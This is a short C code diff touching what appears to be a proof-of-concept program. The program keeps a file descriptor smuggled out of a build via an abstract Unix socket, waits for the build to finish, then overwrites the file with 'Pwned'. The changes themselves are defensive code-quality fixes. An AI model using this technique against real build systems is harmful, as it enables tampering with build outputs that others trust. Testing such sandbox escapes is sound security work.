@@ -16,7 +16,7 @@ int main(int argc, char **argv) {
     struct sockaddr_un data;
     data.sun_family = AF_UNIX;
     data.sun_path[0] = 0;
-    strcpy(data.sun_path + 1, argv[1]);
+    strncpy(data.sun_path + 1, argv[1], sizeof(data.sun_path) - 1);
     int res = bind(sock, (const struct sockaddr *)&data,
         offsetof(struct sockaddr_un, sun_path)
         + strlen(argv[1])
@@ -57,10 +57,11 @@ int main(int argc, char **argv) {
     // Wait for a second connection, which will tell us that the build is
     // done
     a = accept(sock, 0, 0);
+    if (a < 0) perror("accept");
     fprintf(stderr, "%s\n", "Got a second connection, rewriting the file");
     // Write a new content to the file
     if (ftruncate(smuggling_fd, 0)) perror("ftruncate");
-    char * new_content = "Pwned\n";
+    const char * new_content = "Pwned\n";
     int written_bytes = write(smuggling_fd, new_content, strlen(new_content));
     if (written_bytes != strlen(new_content)) perror("write");
 }
